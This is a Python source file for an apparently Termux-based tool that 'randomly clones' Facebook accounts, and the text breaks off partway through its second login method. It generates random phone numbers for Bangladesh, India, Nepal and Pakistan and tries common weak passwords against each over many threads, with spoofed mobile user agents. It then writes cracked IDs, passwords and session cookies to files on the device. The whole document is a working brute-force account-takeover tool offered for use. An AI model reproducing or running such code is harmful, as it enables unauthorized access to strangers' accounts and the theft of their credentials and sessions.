'''
@Code written by Mr.SxR
@Github : Mr-SxR

Use any normol login data and headers in the same method def
example : full Host ,, full authority ,, full app login Host ,, full app login authority ,, All kinds of host and authority mix.
'''
#▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭#
import os,time,sys,re,string,uuid,json,random
from concurrent.futures import ThreadPoolExecutor as threadpol
from os import system as magi
#▬▭▬▭▬▭▬▭[ COLLOR VARIABLES ]▬▭▬▭▬▭▬▭#
a="\033[1;97m";b="\033[1;92m";c="\033[1;91m";d="\033[1;32m";e="\033[1;37m";f="\033[1;96m";g="\033[1;93m";h="\033[1;94m";i="\033[1;95m";j="\x1b[38;5;208m"
#▬▭▬▭▬▭▬▭[ OPTION VARIABLES ]▬▭▬▭▬▭▬▭#
l1=f"{a}[{b}1{a}]";l2=f"{a}[{b}2{a}]";l3=f"{a}[{b}3{a}]";l4=f"{a}[{b}4{a}]";l5=f"{a}[{b}5{a}]";l6=f"{a}[{b}6{a}]";l7=f"{a}[{b}7{a}]";l0=f"{a}[{c}0{a}]";ekual=f"{f}:{a}"
#▬▭▬▭▬▭▬▭[ ENABLE SDCARD ]▬▭▬▭▬▭▬▭#
try:magi('rm -rf /sdcard/..txt');open('/sdcard/..txt','a').write(' ')
except PermissionError:magi("clear");print(f" {b}Please enable storage permission to continue{a}");magi("termux-setup-storage");exit()
#▬▭▬▭▬▭▬▭[ INSTALL ]▬▭▬▭▬▭▬▭#
try:import requests
except ModuleNotFoundError:
    magi("clear");print(f"{b} Installing Module .... ");magi("pip install requests > /dev/null")
#▬▭▬▭▬▭▬▭[ LINE ]▬▭▬▭▬▭▬▭#
sxrline=f"{f}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"
#▬▭▬▭▬▭▬▭[ APPEND ]▬▭▬▭▬▭▬▭#
loop=0
oks,cps,psw,sxr_mthd,numnx,pmsn_ckki=[],[],[],[],[],[]
sys.stdout.write('\x1b]2; Mr. SxR\x07')
#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
def clr_logo():
    magi("clear")
    print(f"""{a}
       .d8888.  db    db  d8888b. 
       88'  YP  `8b  d8'  88  `8D 
       `8bo.     `8bd8'   88oobY' 
         `Y8b.   .dPYb.   88`8b   
       db   8D  .8P  Y8.  88 `88. 
       `8888Y'  YP    YP  88   YD    𝚂✗ᖇ
{sxrline}
 {a}[{b}●{a}] {a}TOOL OWNER    {f}:{b} SIFAT
 {a}[{b}●{a}] {a}FACEBOOK      {f}:{b} MASUDUR RAHMAN SIFAT
 {a}[{b}●{a}] {a}TOOL          {f}:{a} RANDOM
 {a}[{b}●{a}] {a}TOOL STATUS   {f}:{a} PRIVATE
 {a}[{b}●{a}] {a}TOOL VERSION  {f}:{j} (V-07)
{sxrline}""")
#▬▭▬▭▬▭▬▭[ MAIN DEF ]▬▭▬▭▬▭▬▭#
def sxr_main():
    clr_logo()
    print(f" {l1} RANDOM CLONING\n {l2} CONTACT ADMIN\n {l0} EXIT\n{sxrline}")
    chic_opsn=input(f"{b} CHOOSE AN OPTION {ekual} ")
    if chic_opsn in ['1','01','A','a']:sxr_random()
    elif chic_opsn in ['2','02','B','b']:magi("xdg-open https://www.facebook.com/sxr.404");sxr_main()
    elif chic_opsn in ['0','00','O','o']:exit()
    else:print(f"\n{c} You have selected the wrong option..");time.sleep(4);sxr_main()
#▬▭▬▭▬▭▬▭[ SxR RANDOM ]▬▭▬▭▬▭▬▭#
def sxr_random():
    clr_logo();print(f' {l1} BD CLONING\n {l2} INDIA CLONING\n {l3} NEPAL CLONING\n {l4} PAK CLONING\n {l0} BACK MENU\n{sxrline}')
    option=input(f'{b} CHOOSE AN OPTION {ekual} ')
    if option in ['1','01','A','a']:sxr_bd()
    elif option in ['2','02','B','b']:sxr_ind()
    elif option in ['3','03','C','c']:sxr_npl()
    elif option in ['4','04','D','d']:sxr_pak()
    elif option in ['0','00','O','o']:sxr_main()
    else:print(f"\n {c}You have selected the wrong option..");time.sleep(4);sxr_random()
#▬▭▬▭▬▭▬▭[ SxR RANDOM BD ]▬▭▬▭▬▭▬▭#
def sxr_bd():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}017 {a}- {f}018 {a}- {f}019 {a}- {f}016{f}\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(8))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],ids[:7],ids,hugu,'Bangladesh','bangladesh']
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ SxR RANDOM INDIA ]▬▭▬▭▬▭▬▭#
def sxr_ind():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}6390 {a}- {f}6354{a}- {f}9340 {a}- {f}9749\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(6))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],ids[:7],'57273200','57575751']
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in sxr_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ SxR RANDOM NEPAL ]▬▭▬▭▬▭▬▭#
def sxr_npl():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}9815 {a}- {f}9814 {a}- {f}9861 {a}- {f}9840\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(6))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],ids[:7],'nepal123']
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ SxR RANDOM PAKISTAN ]▬▭▬▭▬▭▬▭#
def sxr_pak():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}0300 {a}- {f}0340 {a}- {f}0320 {a}- {f}0330\n{sxrline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{sxrline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(7))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{sxrline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{sxrline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:sxr_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:sxr_mthd.append("B")
    else:sxr_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],ids[:7],'khan1234']
            if 'A' in sxr_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in sxr_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
    print(f"\n{sxrline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/SxR-IDS/ok&cp.txt{f}\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 1 ]▬▭▬▭▬▭▬▭#
#app login
def rndm1(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r\r {a}[{b}SxR-M1{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
            sm_mdl=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
            #ua1 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(sm_mdl))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            ua3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm_mdl))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            git_fb = session.get(f"https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr").text
            logn_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(git_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pww,'jazoest': re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            user_info = {'Host': f'{fb}.facebook.com',
            'Connection': 'keep-alive',
            'Content-Length': '{len(str(logn_data))}',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-model': '"GT-414XOP"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': ua3,
            'viewport-width': '400',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),
            'sec-ch-ua-platform-version': '"9.0.0"',
            'X-ASBD-ID': '129477',
            'dpr': '1.8',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'Accept': '*/*',
            'Origin': f'https://{fb}.facebook.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': f'https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?api_key=212500508799908&auth_token=aedffdb1606919704ead2d4fa891ac15&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&refsrc=deprecated&app_id=212500508799908&cancel=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&lwv=100"
            sxr_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
            login_coki=session.cookies.get_dict().keys()
            if 'c_user' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=re.findall("c_user=(.*);xs", coki)[0]
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[SxR-OK] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    open('/sdcard/SxR-RNDM-OK-COOKIE.txt.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/SxR-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    break
                else:break
            elif 'checkpoint' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split('checkpoint=')[1]
                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
                #print(f"\r\r {c}[SxR-CP] {uid} | {pww}")
                open('/sdcard/SxR-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 2 ]▬▭▬▭▬▭▬▭#
def rndm2(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r\r {a}[{b}SxR-M2{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
            lenovo = ("L18021","PAGK0027IN","L19111","L10041","A7010a48","K350t","K33a48","Lenovo K7","K8 Note","L38043","PAFR0026IN","Lenovo K11","Lenovo K12","Lenovo K13","Lenovo K14")
            ua1 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(lenovo))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            #ua3 = f"Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(mdlx))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            git_fb = session.get(f"https://{fb}.facebook.com").text
            logn_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(git_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pww,"login":"Log In"}
            user_info = {'Host': f'{fb}.facebook.com',
            'Connection': 'keep-alive',
            'Content-Length': '{len(str(logn_data))}',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-model': '"CPH2389"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': ua1,
            'viewport-width': '400',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),
            'sec-ch-ua-platform-version': '"9.7.1"',
            'X-ASBD-ID': '129477',
            'dpr': '1.8',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'Accept': '*/*',
            'Origin': f'https://{fb}.facebook.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': f'https://{fb}.facebook.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            sxr_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
            login_coki=session.cookies.get_dict().keys()
            if 'c_user' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=re.findall("c_user=(.*);xs", coki)[0]
